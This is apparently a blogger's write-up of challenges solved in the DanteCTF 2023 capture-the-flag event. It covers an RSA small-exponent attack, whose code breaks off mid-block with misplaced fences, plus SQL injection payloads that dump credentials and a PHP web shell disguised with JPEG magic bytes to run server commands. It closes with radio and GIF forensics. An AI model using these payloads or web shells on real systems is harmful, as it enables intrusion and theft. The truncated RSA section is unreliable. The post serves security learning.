Hello all! 
I played <a href= "https://ctftime.org/event/2000" target=_blank>DANTECTF 2023</a> which was happened from  02 June to 5 June. I played it with my team [Invaders0x1](https://ctftime.org/team/217079).

This I got you some SQL Injection tutorials here. These are the writeups for the challenges I solved..

```

The `e=3` which is too small for the encryption. There is an attack existed called `Low Exponent Attack` on RSA when `e` was small.

When the e=3, we can get the plaintext by finding the `cube root` of the `ct`. Because the ciphertext was just the message rised to the e.

There is a catch to note. When `pow(m,e)` is less than the modulus, we can just calculate the cube root of the `ct` to get message. If not, we have to find the cube root of `(ct+kN)` where `k` is some integer in the field. 

As the message in the challenge already about 50 chars, the `pow(m,e)` might be greater than the `N`. So, I implemented the second case to get the flag.

```python
from gmpy2 import iroot

n = 20948184905072216948549865445605798631663501453911333956435737119029531982149517142273321144075961800694876109056203145122426451759388059831044529163118093342195028080582365702020138256379699270302368673086923715628087508705525518656689253472590622223905341942685751355443776992006890500774938631896675247850244098414397183590972496171655304801215957299268404242039713841456437577844606152809639584428764129318729971500384064454823140992681760685982999247885351122505154646928804561614506313946302901152432476414517575301827992421830229939161942896560958118364164451179787855749084154517490249401036072261469298158281

# Dante Barber Shop

Description : 

```text
Welcome to our renowned barber shop!
Your task, should you choose to accept it, is to uncover hidden information and retrieve the sensitive data that the owners may have left around.

Challenge : https://barbershop.challs.dantectf.it
```

The website presents few photos and a login page. Viewing the source code reveals that there is an another image which was not showed in the website.

```html
<img src="img/barber2.jpg" alt="Barber Shop">
<img src="img/barber3.jpg" alt="Barber Shop">
<img src="img/barber4.jpg" alt="Barber Shop">
<img src="img/barber5.jpg" alt="Barber Shop">
<img src="img/barber6.jpg" alt="Barber Shop">
<img src="img/barber7.jpg" alt="Barber Shop">
```

Okay the `img/barber1.jpg` was not displayed here. By trying to access it revealed the barber credentials.

**https://barbershop.challs.dantectf.it/img/barber1.jpg**

![Barber](/assets/img/post_img/dante23_barber1.png)

Used `barber : dant3barbersh0p_cLIVeSidag` to login. A customer database was displayed and a search field was available to search for the entries. 

When I searh for `'` in the search field a `sqlite3` error were displayed. So, It was confirmed that the `SQL Injection` vulnerability in the system. 

- Then I enumerated the number of columns with the `UNION`.

	- Payload `' union select 1,2,3,4--` Confirms that there were 4 columns available.
- Enumerating table name

	- Payload `' union select 1,group_concat(tbl_name),3,4 FROM sqlite_master WHERE type = "table"-- ` returned the column names `users,sqlite_sequence,customers` 

- Selected columns from table

	- Payload `' union select 1,sql,3,4 from sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name='users'--` confirms the columns names `id,username,password`.

- So now we have table name as well as column name, final thing which we need to do is, extraction of data from the desired column which can be performed by simple SQL query.

	- Payload `'union SELECT 1,username,password,4 FROM users--` printed the admin crendentials on the screen.

	- `admin : nSOrowLIstERiMbrUsHConesueyeadEr`

When I logged in to the website with admin credentials, the flag was displayed in the admin dashboard.

# Dumb Admin

Description :

```text
The Admin coded his dashboard by himself. He’s sure to be a pro coder and he’s so satisfied about it. Can you make him rethink that?

Challenge : https://dumbadmin.challs.dantectf.it/
```

The website was a login page. After some failed tries to find crendentials of the source of the website, I tried to use a basic login bypass `SQL injection` payload.

Username : `admin' 1=1 --`
Password : `1234`

This payload was worked fine and I was able to login as admin. 

The admin page has a option to upload a image.

![dumb](/assets/img/post_img/dante23_dubm1.png)

I thought that there might be a `File upload` vulnerability in the website.

First uploaded a jpg of 2 kb and it was rendered in the webpage. When I view the source code, I found a direct url to the image uploaded.

`https://dumbadmin.challs.dantectf.it/f9bbbecb61014db8f0674bf60c27e668/8347dc6bbcfb8d457453656ae33181d7.png`

So, If we upload a php file we can execute in by going to the actual URL. 

The `php` file `file.php`

```php
<?php system($_GET['cmd']); ?>
```

What this code will do is, This can execute the commands passed in the `cmd` argument in the URL of the file.php

I tried to upload this on the website, Got an error message.

`The extension '.php' indicate it is not an image!` 

So, Tried some extension bypass techniques on the hacktricks webpage. Now uploaded the file as `file.jpg.php`. Again got an error.

`Uploaded file seems to be not a real image!`

Okay, there might be a magic bytes check was done here. So, I edited the magic bytes of the `file.jpg.php` with the **hexed.it** webtool. Inserted the `jpg` header values to the `file.jpg.php`. 

```bash
00000000: ffd8 ff3c 3f70 6870 0a09 6563 686f 2073  ...<?php..echo s
00000010: 6865 6c6c 5f65 7865 6328 245f 4745 545b  hell_exec($_GET[
00000020: 2763 6d64 275d 293b 0a3f 3e0a            'cmd']);.?>.
```

So, as we can see in the above hexdump of the file contains jpg headers.

Lets try to upload this file.

This time everything was fine and the image `file.jpg.php` was not rendered as it is not an image. I moved to the actual URL of the uploaded file as we already founf it in the beginning. 

I moved to `https://dumbadmin.challs.dantectf.it/f9bbbecb61014db8f0674bf60c27e668/9180871cb76494741eb99e2181d57e54.jpg.php`

And there were nothing to see, then i passed `ls` in the `cmd` argument from the URL. 

Boom, This prints the list of files available on the server. 

Now we can move across the file system of the server, I found the flag was at `/flag.txt`. 

The URL, `https://dumbadmin.challs.dantectf.it/f9bbbecb61014db8f0674bf60c27e668/9180871cb76494741eb99e2181d57e54.jpg.php?cmd=cat%20/flag.txt` . Prints out the flag for us

# Imago Qualitatis

Description : 

```text
A wondrous electromagnetic wave was captured by a metal-stick-handed devil.
“But.. What? No, not this way. Maybe, if I turn around like this… Aha!”

Attached file : [ImagoQualitatis.7z]
```

The ImagoQualitatis.7z archive contains the `gqrx_20230421_133330_433000000_1800000_fc.raw` file of size 4GB+.

I searched about the term `gqrx` on google, and found that it was a radio transmission raw file.
/
The software used to generate this file was `gqrx sdr`, which is an open source software defined radio receiver (SDR) powered by the GNU Radio and the Qt graphical toolkit. 

Then I installed it on my machine using the following command

`sudo apt-get install gnuradio gqrx`

Then Launched the software with the command `gqrx`. It loaded the software. 

![gqrx](/assets/img/post_img/dante23_imago1.png)

I dont know how to play the `raw` file in this software.

<a href="https://hamsci.org/resource/how-play-rri-raw-iq-file-gqrx" target="_blank">This</a> tutorial helped me to load the raw file on the gqrx software. 

I played the raw file and observed the spectrum displayed on in the software console. I saw flag characters were display with some delay in between them.

![gqrx](/assets/img/post_img/dante23_imago2.png)

Noted down the characters on paper.

# Do You Know GIF?

Description : 

```text
Ah, Dante! He appears in poems, videogames… He wrote about a lot of people but few have something meaningful to say about him nowadays.

Attached file : [dante.gif(14mb)]
```

The file size tempted me to check for the embedded files in the GIF using `steghide`,`stegoveritas` and `stegextract` and many more, but none of them was able to extract data. 

Then tried exiftool on the `dante.gif`. Found a comment but it was not a flag. After trying all options on exiftool `-a` of exiftool loaded all the comments of `dante.gif` file.


```bash
mj0ln1r@Linux:/$ exiftool dante.gif  | grep Comment
Comment                         : Hey look, a comment!
mj0ln1r@Linux:/$ exiftool -a dante.gif  | grep Comment
Comment                         : Hey look, a comment!
Comment                         : These comments sure do look useful
Comment                         : I wonder what else I could do with them?
Comment                         : 44414e54457b673166355f
Comment                         : 3472335f6d3464335f6279
Comment                         : 5f626c30636b357d
Comment                         : At the edges of the map lies the void
```

Converted the hex strings to ascii to get the flag
